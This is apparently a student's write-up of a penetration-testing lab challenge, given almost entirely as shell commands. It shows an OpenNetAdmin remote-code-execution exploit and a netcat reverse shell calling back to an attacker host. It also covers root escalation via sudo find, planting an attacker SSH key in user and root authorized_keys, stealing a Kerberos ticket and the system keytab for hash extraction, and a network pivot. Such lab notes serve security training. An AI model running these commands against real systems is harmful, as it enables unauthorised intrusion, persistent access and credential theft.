# Challenge 5

## Enumeration

### External Hosts

#### **192.168.72.164**

**192.168.72.169**

### **Internal Hosts**

#### 172.16.72.160

#### 172.16.72.165

#### 172.16.72.166

#### 172.16.72.167

#### 172.16.72.168

## Exploitation

### Initial Access to web05 (192.168.100.164)

```bash
# Exploit OpenNetAdmin 18.1.1 - Remote Code Execution
cd ona-rce
python3 ona-rce.py exploit http://192.168.100.164
# Execute reverse shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.100 443 >/tmp/f
```

### Privilege Escalation on web05 (192.168.100.164)

```bash
sudo find . -exec /bin/sh \; -quit
```

### Post Exploitation on web05 (192.168.100.164)

{% code overflow="wrap" %}
```bash
# Change to ssh directory for pete domain user
cd /home/pete@complyedge.com/.ssh/
# Add public key to authorized keys file
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYU7cbck9dVt4TqiUWftp+wDvN0/Xoi85L9BV+nkodZA+SCQcjjGcuWxWfuVwCyHKdyeIX8AfLKXvB1QyMGQedgcakZmsUxfoFA99bT5ww36bQKVTk+Rg3bAOlkh2TrO9bmNfpzAZM2UduEXOYyxrKYlauAyj33ei9NHDS9tZ0+WEuSMPhkJ638kd/JMRNxIa4YdQ47rMKVmxgnFZUXxITF18od/MWuKfDnyK8qkoghV/iQkPQafLmzVFOOPyzMq/2uXl/zo62NQndNR0ay212pC7+csJC9xJuEOwRNku19beCF9E1Urh2y8IVdxIaaz8KocC/b97HxzAlFXfDdOnTEUqIttmXlnuxgnKjxeIumLAjzeYpviKxRAPZhvN7gBLcfS7FYSiIoGmJM5CIveCAuqIJXYXswCBMgw+CiuymDe41hL2JjTqJplVeS6lYBnUtt/QSnVaI2hxxkNGIsDYFs9dvslwJKRi4J/4/ELXkDkk/RtbClAmPBCsIUhfp9H8= kali@kali' > authorized_keys
# Change to root directory
cd /root
# Create root ssh key
ssh-keygen
# Change to root .ssh directory
cd .ssh
# Create root authorized keys file
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYU7cbck9dVt4TqiUWftp+wDvN0/Xoi85L9BV+nkodZA+SCQcjjGcuWxWfuVwCyHKdyeIX8AfLKXvB1QyMGQedgcakZmsUxfoFA99bT5ww36bQKVTk+Rg3bAOlkh2TrO9bmNfpzAZM2UduEXOYyxrKYlauAyj33ei9NHDS9tZ0+WEuSMPhkJ638kd/JMRNxIa4YdQ47rMKVmxgnFZUXxITF18od/MWuKfDnyK8qkoghV/iQkPQafLmzVFOOPyzMq/2uXl/zo62NQndNR0ay212pC7+csJC9xJuEOwRNku19beCF9E1Urh2y8IVdxIaaz8KocC/b97HxzAlFXfDdOnTEUqIttmXlnuxgnKjxeIumLAjzeYpviKxRAPZhvN7gBLcfS7FYSiIoGmJM5CIveCAuqIJXYXswCBMgw+CiuymDe41hL2JjTqJplVeS6lYBnUtt/QSnVaI2hxxkNGIsDYFs9dvslwJKRi4J/4/ELXkDkk/RtbClAmPBCsIUhfp9H8= kali@kali' > authorized_keys
# ssh as pete
ssh pete@complyedge.com@192.168.100.164
# List tmp folder to find file name of kerberos TGT
ls -al /tmp
# Download TGT for Pete
scp pete@complyedge.com@192.168.100.164:/tmp/krb5cc_75401103_jT6uMx .
# Import TGT
export KRB5CCNAME=/home/kali/Challenge5/krb5cc_75401103_jT6uMx
# Copy keytab file
scp root@192.168.100.164:/etc/krb5.keytab .
# Extract hashes from keytab file
python3 /home/kali/data/OSEP/Challenge5/keytabextract.py krb5.keytab
```
{% endcode %}

### Setup Port Forward

{% code overflow="wrap" %}
```bash
# Setup port forward on web05
sshuttle -v -e "ssh -i /home/kali/.ssh/id_rsa" -r root@192.168.100.164 172.16.100.0/24
```
{% endcode %}
